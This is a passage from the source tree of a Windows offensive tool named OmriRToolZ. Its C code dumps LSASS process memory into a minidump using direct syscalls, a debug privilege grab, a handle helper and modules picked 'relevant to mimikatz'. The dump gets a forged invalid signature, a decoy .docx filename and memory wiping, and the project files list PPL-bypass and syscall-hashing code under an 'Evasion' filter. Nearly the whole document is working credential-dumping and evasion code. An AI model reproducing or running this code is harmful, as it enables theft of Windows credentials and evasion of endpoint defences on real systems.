        besomemcpy_fast(module_bytes + offset, &module.CheckSum, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.TimeDateStamp, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.ModuleNameRva, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.VersionInfo.dwSignature, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.VersionInfo.dwStrucVersion, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.VersionInfo.dwFileVersionMS, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.VersionInfo.dwFileVersionLS, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.VersionInfo.dwProductVersionMS, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.VersionInfo.dwProductVersionLS, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.VersionInfo.dwFileFlagsMask, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.VersionInfo.dwFileFlags, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.VersionInfo.dwFileOS, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.VersionInfo.dwFileType, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.VersionInfo.dwFileSubtype, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.VersionInfo.dwFileDateMS, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.VersionInfo.dwFileDateLS, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.CvRecord.DataSize, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.CvRecord.rva, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.MiscRecord.DataSize, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.MiscRecord.rva, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.Reserved0, 8); offset += 8;
        besomemcpy_fast(module_bytes + offset, &module.Reserved1, 8);

        append(dc, module_bytes, sizeof(module_bytes));
        curr_module = curr_module->next;
    }

    // write our length in the MiniDumpSystemInfo directory
    ULONG32 stream_size = 4 + number_of_modules * sizeof(module_bytes);
    writeat(dc, 32 + 12 + 4, &stream_size, 4); // header + 1 directory + streamType

    // write our RVA in the MiniDumpSystemInfo directory
    writeat(dc, 32 + 12 + 4 + 4, &stream_rva, 4); // header + 1 directory + streamType + Location.DataSize

    return module_list;
}

void free_linked_list(
    void* head
)
{
    if (head == NULL)
        return;

    ULONG32 number_of_nodes = 1;
    struct linked_list* node = (struct linked_list*)head;
    while (node->next)
    {
        number_of_nodes++;
        node = node->next;
    }

    for (int i = number_of_nodes - 1; i >= 0; i--)
    {
        struct linked_list* node = (struct linked_list*)head;

        int jumps = i;
        while (jumps--)
            node = node->next;

        intFree(node); node = NULL;
    }
}

BOOL is_important_module(
    PVOID address,
    struct module_info* module_list
)
{
    struct module_info* curr_module = module_list;
    while (curr_module)
    {
        if ((ULONG_PTR)address >= (ULONG_PTR)curr_module->dll_base &&
            (ULONG_PTR)address < (ULONG_PTR)curr_module->dll_base + curr_module->size_of_image)
            return TRUE;
        curr_module = curr_module->next;
    }
    return FALSE;
}

struct MiniDumpMemoryDescriptor64* get_memory_ranges(
    struct dump_context* dc,
    struct module_info* module_list
)
{
    struct MiniDumpMemoryDescriptor64* ranges_list = NULL;
    PVOID base_address, current_address;
    ULONG64 region_size;
    current_address = 0;
    MEMORY_INFORMATION_CLASS mic = 0;
    MEMORY_BASIC_INFORMATION mbi;

    while (TRUE)
    {
        NTSTATUS status = _NtQueryVirtualMemory(
            dc->hProcess,
            (PVOID)current_address,
            mic,
            &mbi,
            sizeof(mbi),
            NULL
        );
        if (!NT_SUCCESS(status))
            break;

        base_address = mbi.BaseAddress;
        region_size = mbi.RegionSize;
        // next memory range
        current_address = (char*)base_address + region_size;

        // ignore non-commited pages
        if (mbi.State != MEM_COMMIT)
            continue;
        // ignore pages with PAGE_NOACCESS
        if ((mbi.Protect & PAGE_NOACCESS) == PAGE_NOACCESS)
            continue;
        // ignore mapped pages
        if (mbi.Type == MEM_MAPPED)
            continue;
        // ignore pages with PAGE_GUARD as they can't be read
        if ((mbi.Protect & PAGE_GUARD) == PAGE_GUARD)
            continue;
        // ignore modules that are not relevant to mimikatz
        if (mbi.Type == MEM_IMAGE &&
            !is_important_module(
                base_address,
                module_list))
            continue;

        struct MiniDumpMemoryDescriptor64* new_range = (struct MiniDumpMemoryDescriptor64*)intAlloc(sizeof(struct MiniDumpMemoryDescriptor64));
        if (!new_range)
        {

            return NULL;
        }
        new_range->next = NULL;
        new_range->StartOfMemoryRange = (ULONG_PTR)base_address;
        new_range->DataSize = region_size;

        if (!ranges_list)
        {
            ranges_list = new_range;
        }
        else
        {
            struct MiniDumpMemoryDescriptor64* last_range = ranges_list;
            while (last_range->next)
                last_range = last_range->next;
            last_range->next = new_range;
        }
    }
    return ranges_list;
}

struct MiniDumpMemoryDescriptor64* write_memory64_list_stream(
    struct dump_context* dc,
    struct module_info* module_list
)
{
    ULONG32 stream_rva = dc->rva;

    struct MiniDumpMemoryDescriptor64* memory_ranges = get_memory_ranges(
        dc,
        module_list
    );
    if (!memory_ranges)
        return FALSE;

    // write the number of ranges
    ULONG64 number_of_ranges = 1;
    struct MiniDumpMemoryDescriptor64* curr_range = memory_ranges;
    while (curr_range->next && number_of_ranges++)
        curr_range = curr_range->next;
    append(dc, &number_of_ranges, 8);

    // write the rva of the actual memory content
    ULONG32 stream_size = 16 + 16 * number_of_ranges;
    ULONG64 base_rva = stream_rva + stream_size;
    append(dc, &base_rva, 8);

    // write the start and size of each memory range
    curr_range = memory_ranges;
    while (curr_range)
    {
        append(dc, &curr_range->StartOfMemoryRange, 8);
        append(dc, &curr_range->DataSize, 8);
        curr_range = curr_range->next;
    }

    // write our length in the MiniDumpSystemInfo directory
    writeat(dc, 32 + 12 * 2 + 4, &stream_size, 4); // header + 2 directories + streamType

    // write our RVA in the MiniDumpSystemInfo directory
    writeat(dc, 32 + 12 * 2 + 4 + 4, &stream_rva, 4); // header + 2 directories + streamType + Location.DataSize

    // dump all the selected memory ranges
    curr_range = memory_ranges;
    while (curr_range)
    {
        byte* buffer = (byte*)intAlloc(curr_range->DataSize);
        if (!buffer)
        {

            return NULL;
        }
        NTSTATUS status = _NtReadVirtualMemory(
            dc->hProcess,
            (PVOID)(ULONG_PTR)curr_range->StartOfMemoryRange,
            buffer,
            curr_range->DataSize,
            NULL
        );
        if (!NT_SUCCESS(status))
        {
            printf("Failed to call NtRead, status: 0x%lx\n", status);
            //return NULL;
        }

        append(dc, buffer, curr_range->DataSize);
        intFree(buffer); buffer = NULL;
        curr_range = curr_range->next;
    }

    return memory_ranges;
}

BOOL NanoDumpWriteDump(
    struct dump_context* dc
)
{
    write_header(dc);

    write_directories(dc);

    if (!write_system_info_stream(dc))
        return FALSE;

    struct module_info* module_list;
    module_list = write_module_list_stream(dc);
    if (!module_list)
        return FALSE;

    struct MiniDumpMemoryDescriptor64* memory_ranges;
    memory_ranges = write_memory64_list_stream(dc, module_list);
    if (!memory_ranges)
        return FALSE;

    free_linked_list(module_list); module_list = NULL;

    free_linked_list(memory_ranges); memory_ranges = NULL;

    return TRUE;
}

void encrypt_dump(
    void* BaseAddress,
    ULONG32 Size
)
{
    // add your code here
    return;
}

void usage(char* procname)
{
    printf("usage: %s --write C:\\Windows\\Temp\\omri.docx [--valid] [--pid 1234] [-m 1/2/3] [--help]\n", procname);
}

void get_invalid_sig(char* signature)
{
    time_t t;
    srand((unsigned)time(&t));
    signature[0] = 'P';
    signature[1] = 'M';
    signature[2] = 'D';
    signature[3] = 'M';

    while (!strncmp(signature, "PMDM", 4))
    {
        signature[0] = rand() & 0xFF;
        signature[1] = rand() & 0xFF;
        signature[2] = rand() & 0xFF;
        signature[3] = rand() & 0xFF;
    }
}



int main(int argc, char* argv[])
{

    RevertToSelf();
    DWORD MethodType = 2;
    int pid = 0;
    char* dump_name = NULL;
    char signature[4];
    BOOL success;

    // generate a random signature
    get_invalid_sig(signature);

    for (int i = 1; i < argc; ++i)
    {
        if (!strncmp(argv[i], "-v", 3) || !strncmp(argv[i], "--valid", 8))
        {
            signature[0] = 'P';
            signature[1] = 'M';
            signature[2] = 'D';
            signature[3] = 'M';
        }

        if (!strncmp(argv[i], "-w", 3) || !strncmp(argv[i], "--write", 8))
        {
            dump_name = argv[++i];
        }
        else if (!strncmp(argv[i], "-p", 3))
        {
            pid = atoi(argv[++i]);
        }

        else if (!strncmp(argv[i], "-m", 3))
        {
            MethodType = atoi(argv[++i]);
        }
        else if (!strncmp(argv[i], "-h", 3) || !strncmp(argv[i], "--help", 7))
        {
            usage(argv[0]);
            return 0;
        }

    }



    if (!dump_name)
    {
        usage(argv[0]);
        return -1;
    }

    if (!strrchr(dump_name, '\\'))
    {
        return -1;
    }

    success = SetDebugPrivilege();
    if (success)
    {
        printf("%s", "got priv!\n");
    }


    HANDLE hProcess = 0;
    if (pid)
        hProcess = GetLsassHandle(pid, MethodType);

    if (!hProcess)
        return -1;

    // allocate a chuck of memory to write the dump
    void* BaseAddress = NULL;
    SIZE_T RegionSize = DUMP_MAX_SIZE;
    NTSTATUS status = _NtAllocateVirtualMemory(NtCurrentProcess(), &BaseAddress, 0, &RegionSize, MEM_COMMIT, PAGE_READWRITE);
    if (!NT_SUCCESS(status))
    {
        _NtClose(hProcess); hProcess = NULL;
        return -1;
    }

    struct dump_context dc;
    dc.hProcess = hProcess;
    dc.BaseAddress = BaseAddress;
    dc.rva = 0;
    dc.signature = signature;

    success = NanoDumpWriteDump(&dc);

    // at this point, you can encrypt or obfuscate the dump
    encrypt_dump(dc.BaseAddress, dc.rva);

    if (success)
    {
        success = write_file(
            dump_name,
            dc.BaseAddress,
            dc.rva
        );
    }

    // delete all trace of the dump from memory

    besomemset_stosb(BaseAddress, 0, dc.rva);
    // free the memory area where the dump was
    status = _NtFreeVirtualMemory(
        NtCurrentProcess(),
        &BaseAddress,
        &RegionSize,
        MEM_RELEASE
    );
    if (!NT_SUCCESS(status))
    {
        printf("Failed to call Free, status: 0x%lx\n", status);
    }

    // close the handle
    _NtClose(hProcess); hProcess = NULL;

    if (success)
    {
        printf("Done!");
    }
    return 0;
}


```

`OmriRToolZ/OmriRToolZ.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{3e806623-dbd3-467b-a344-05d03c412d15}</ProjectGuid>
    <RootNamespace>OmriRToolZ</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
    <Import Project="$(VCTargetsPath)\BuildCustomizations\masm.props" />
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions);_CRT_SECURE_NO_WARNINGS</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions);_CRT_SECURE_NO_WARNINGS</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="CPP_helpers.cpp" />
    <ClCompile Include="OmriRToolZ.c" />
    <ClCompile Include="ppl_bypass_driver.cpp" />
    <ClCompile Include="SysCallsFinder.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="CPP_helpers.h" />
    <ClInclude Include="include\nanodump.h" />
    <ClInclude Include="include\syscalls.h" />
    <ClInclude Include="ppl_bypass_driver.h" />
    <ClInclude Include="resource.h" />
    <ClInclude Include="SysCallsFinder.h" />
  </ItemGroup>
  <ItemGroup>
    <MASM Include="asm.asm">
      <FileType>Document</FileType>
    </MASM>
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="Resource.rc" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
    <Import Project="$(VCTargetsPath)\BuildCustomizations\masm.targets" />
  </ImportGroup>
</Project>
```

`OmriRToolZ/OmriRToolZ.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="Evasion">
      <UniqueIdentifier>{49976d1e-5603-43c0-86d0-7cfcdbb8872a}</UniqueIdentifier>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="OmriRToolZ.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="ppl_bypass_driver.cpp">
      <Filter>Evasion</Filter>
    </ClCompile>
    <ClCompile Include="SysCallsFinder.cpp">
      <Filter>Evasion</Filter>
    </ClCompile>
    <ClCompile Include="CPP_helpers.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="ppl_bypass_driver.h">
      <Filter>Evasion</Filter>
    </ClInclude>
    <ClInclude Include="SysCallsFinder.h">
      <Filter>Evasion</Filter>
    </ClInclude>
    <ClInclude Include="include\nanodump.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="include\syscalls.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="CPP_helpers.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="resource.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <MASM Include="asm.asm">
      <Filter>Evasion</Filter>
    </MASM>
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="Resource.rc">
      <Filter>Resource Files</Filter>
    </ResourceCompile>
  </ItemGroup>
</Project>
```

`OmriRToolZ/OmriRToolZ.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup />
</Project>
```

`OmriRToolZ/Resource.rc`:

```rc
// Microsoft Visual C++ generated resource script.
//
#include "resource.h"

#define APSTUDIO_READONLY_SYMBOLS
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 2 resource.
//
#include "winres.h"

/////////////////////////////////////////////////////////////////////////////
#undef APSTUDIO_READONLY_SYMBOLS

/////////////////////////////////////////////////////////////////////////////
// English (United States) resources

#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)
LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US
#pragma code_page(1252)

#ifdef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// TEXTINCLUDE
//

1 TEXTINCLUDE 
BEGIN
    "resource.h\0"
END

2 TEXTINCLUDE 
BEGIN
    "#include ""winres.h""\r\n"
    "\0"
END

3 TEXTINCLUDE 
BEGIN
    "\r\n"
    "\0"
END

#endif    // APSTUDIO_INVOKED


/////////////////////////////////////////////////////////////////////////////
//
// Version
//

VS_VERSION_INFO VERSIONINFO
 FILEVERSION 0,1,0,0
 PRODUCTVERSION 0,1,0,0
 FILEFLAGSMASK 0x3fL
#ifdef _DEBUG
 FILEFLAGS 0x1L
#else
 FILEFLAGS 0x0L
#endif
 FILEOS 0x40004L
 FILETYPE 0x1L
 FILESUBTYPE 0x0L
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "200004b0"
        BEGIN
            VALUE "CompanyName", "Besolabs LTD"
            VALUE "FileDescription", "OmriRTool - For Besousers"
            VALUE "FileVersion", "0.1.0.0"
            VALUE "InternalName", "OmriRTool.exe"
            VALUE "LegalCopyright", "All Rights Reserved To Besolabs - Copyright (C) 2023 "
            VALUE "OriginalFilename", "OmriRTool.exe"
            VALUE "ProductName", "OmriRTool.exe"
            VALUE "ProductVersion", "0.1.0.0"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x2000, 1200
    END
END


/////////////////////////////////////////////////////////////////////////////
//
// Icon
//

// Icon with lowest ID value placed first to ensure application icon
// remains consistent on all systems.
//IDI_ICON1               ICON                    "icon.ico"

#endif    // English (United States) resources
/////////////////////////////////////////////////////////////////////////////



#ifndef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 3 resource.
//


/////////////////////////////////////////////////////////////////////////////
#endif    // not APSTUDIO_INVOKED


```

`OmriRToolZ/SysCallsFinder.cpp`:

```cpp
#include "SysCallsFinder.h"

OB97_SYSCALL_LIST OB97_SyscallList;

DWORD OB97_Hash(PCSTR FunctionName)
{
    DWORD i = 0;
    DWORD Hash = OB97_SEED;
    const char* omri3 = "stop reversing me";
    while (FunctionName[i])
    {
        WORD PartialName = *(WORD*)((ULONG64)FunctionName + i++);
        Hash ^= PartialName + OB97_ROR8(Hash);
    }

    return Hash;
}

BOOL OB97_PopulateList()
{
    // Return early if the list is already populated.
    const char* omri1 = "stop reversing me";
    if (OB97_SyscallList.Count) return TRUE;

    POB97_PEB Peb = (POB97_PEB)__readgsqword(0x60);
    POB97_PEB_LDR_DATA Ldr = Peb->Ldr;
    PIMAGE_EXPORT_DIRECTORY ExportDirectory = NULL;
    PVOID DllBase = NULL;

    POB97_LDR_DATA_TABLE_ENTRY LdrEntry;
    for (LdrEntry = (POB97_LDR_DATA_TABLE_ENTRY)Ldr->Reserved2[1]; LdrEntry->DllBase != NULL; LdrEntry = (POB97_LDR_DATA_TABLE_ENTRY)LdrEntry->Reserved1[0])
    {
        DllBase = LdrEntry->DllBase;
        PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)DllBase;
        PIMAGE_NT_HEADERS NtHeaders = OB97_RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);
        const char* omri5 = "stop reversing me";
        PIMAGE_DATA_DIRECTORY DataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirectory;
        DWORD VirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if (VirtualAddress == 0) continue;

        ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)OB97_RVA2VA(ULONG_PTR, DllBase, VirtualAddress);

        // If this is NTDLL.dll, exit loop.
        PCHAR DllName = OB97_RVA2VA(PCHAR, DllBase, ExportDirectory->Name);
        const char* omri2 = "stop reversing me";
        if ((*(ULONG*)DllName | 0x20202020) != 0x6c64746e) continue;
        if ((*(ULONG*)(DllName + 4) | 0x20202020) == 0x6c642e6c) break;
    }


    if (!ExportDirectory) return FALSE;

    DWORD NumberOfNames = ExportDirectory->NumberOfNames;
    PDWORD Functions = OB97_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfFunctions);
    PDWORD Names = OB97_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfNames);
    const char* omri6 = "stop reversing me";
    PWORD Ordinals = OB97_RVA2VA(PWORD, DllBase, ExportDirectory->AddressOfNameOrdinals);

    // Populate OB97_SyscallList with unsorted Zw* entries.
    DWORD i = 0;
    POB97_SYSCALL_ENTRY Entries = OB97_SyscallList.Entries;
    do
    {
        PCHAR FunctionName = OB97_RVA2VA(PCHAR, DllBase, Names[NumberOfNames - 1]);

        // Is this a system call?
        if (*(USHORT*)FunctionName == 'wZ')
        {
            Entries[i].Hash = OB97_Hash(FunctionName);
            Entries[i].Address = Functions[Ordinals[NumberOfNames - 1]];

            i++;
            if (i == OB97_MAX_ENTRIES) break;
        }
    } while (--NumberOfNames);

    // Save total number of system calls found.
    OB97_SyscallList.Count = i;
    const char* omri = "stop reversing me";
    // Sort the list by address in ascending order.
    for (DWORD i = 0; i < OB97_SyscallList.Count - 1; i++)
    {
        for (DWORD j = 0; j < OB97_SyscallList.Count - i - 1; j++)
        {
            if (Entries[j].Address > Entries[j + 1].Address)
            {
                // Swap entries.
                OB97_SYSCALL_ENTRY TempEntry;

                TempEntry.Hash = Entries[j].Hash;
                TempEntry.Address = Entries[j].Address;

                Entries[j].Hash = Entries[j + 1].Hash;
                Entries[j].Address = Entries[j + 1].Address;

                Entries[j + 1].Hash = TempEntry.Hash;
                Entries[j + 1].Address = TempEntry.Address;
            }
        }
    }

    return TRUE;
}

EXTERN_C DWORD OB97_GetNumber(DWORD FunctionHash)
{
    // Ensure OB97_SyscallList is populated.
    const char* omri = "stop reversing me";
    if (!OB97_PopulateList()) return -1;

    for (DWORD i = 0; i < OB97_SyscallList.Count; i++)
    {
        if (FunctionHash == OB97_SyscallList.Entries[i].Hash)
        {
            return i;
        }
    }

    return -1;
}
```

`OmriRToolZ/SysCallsFinder.h`:

```h
#pragma once


#ifndef OB97_HEADER_H_
#define OB97_HEADER_H_

#include <Windows.h>

#define OB97_SEED 0x2924F1F8
#define OB97_ROL8(v) (v << 8 | v >> 24)
#define OB97_ROR8(v) (v >> 8 | v << 24)
#define OB97_ROX8(v) ((OB97_SEED % 2) ? OB97_ROL8(v) : OB97_ROR8(v))
#define OB97_MAX_ENTRIES 500
#define OB97_RVA2VA(Type, DllBase, Rva) (Type)((ULONG_PTR) DllBase + Rva)

// Typedefs are prefixed to avoid pollution.

typedef struct _OB97_SYSCALL_ENTRY
{
	DWORD Hash;
	DWORD Address;
} OB97_SYSCALL_ENTRY, * POB97_SYSCALL_ENTRY;

typedef struct _OB97_SYSCALL_LIST
{
	DWORD Count;
	OB97_SYSCALL_ENTRY Entries[OB97_MAX_ENTRIES];
} OB97_SYSCALL_LIST, * POB97_SYSCALL_LIST;

typedef struct _OB97_PEB_LDR_DATA {
	BYTE Reserved1[8];
	PVOID Reserved2[3];
	LIST_ENTRY InMemoryOrderModuleList;
} OB97_PEB_LDR_DATA, * POB97_PEB_LDR_DATA;

typedef struct _OB97_LDR_DATA_TABLE_ENTRY {
	PVOID Reserved1[2];
	LIST_ENTRY InMemoryOrderLinks;
	PVOID Reserved2[2];
	PVOID DllBase;
} OB97_LDR_DATA_TABLE_ENTRY, * POB97_LDR_DATA_TABLE_ENTRY;

typedef struct _OB97_PEB {
	BYTE Reserved1[2];
	BYTE BeingDebugged;
	BYTE Reserved2[1];
	PVOID Reserved3[2];
	POB97_PEB_LDR_DATA Ldr;
} OB97_PEB, * POB97_PEB;

EXTERN_C DWORD OB97_Hash(PCSTR FunctionName);
BOOL OB97_PopulateList();
EXTERN_C DWORD OB97_GetNumber(DWORD FunctionHash);



#endif

```

`OmriRToolZ/asm.asm`:

```asm
.code

EXTERN  OB97_GetNumber: PROC

besomemset_stosb PROC
        push rdi
        mov     rax, rdx                        ; set byte to move
        mov     rdi, rcx                        ; set destination
        mov     rcx, r8                         ; set count
        rep     stosb                           ; store the bytes

        mov rax, rdi
        pop rdi
        ret                                     ; return
besomemset_stosb ENDP

besomemcpy_fast PROC
	 mov r10, rdi ; save the values 
	 mov r11, rsi ; save the values currently in the stack
	 mov rdi, rcx ; move the first parameter that was sent to be the destination buffer
	 mov rsi, rdx ; move the second parameter that was sent to be the source buffer
	 mov rcx, r8 ; move the third parameter that was sent to be the size of the of the source buffer
	 shr rcx, 3 ; Signed division by 8 because we are on 64 bit, so we split the size into the number of bytes we transfer, for example 76 / 8
	 rep movsq ; move qword (move in bigger chunks of memroy)
	 mov rcx, r8 ;  now move the size again, 
